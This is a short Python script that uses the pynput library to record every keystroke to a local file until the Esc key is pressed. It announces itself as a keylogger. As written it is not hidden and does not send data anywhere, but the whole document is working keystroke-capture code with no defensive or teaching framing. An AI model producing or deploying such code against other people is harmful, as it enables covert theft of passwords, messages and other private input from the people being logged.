import os
from pynput import keyboard

log_file_path = "key_log.txt"

def on_press(key):
    try:
        with open(log_file_path, "a") as log_file:
            log_file.write(f"{key.char}")
    except AttributeError:
        # Special keys (e.g., shift, ctrl) have no char attribute
        with open(log_file_path, "a") as log_file:
            log_file.write(f"{key}")

def on_release(key):
    if key == keyboard.Key.esc:
        # Stop listener
        return False

def main():
    # Clear log file at the start
    if os.path.exists(log_file_path):
        os.remove(log_file_path)

    print(f"Keylogger is running... Press 'Esc' to stop.")
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

if __name__ == "__main__":
    main()
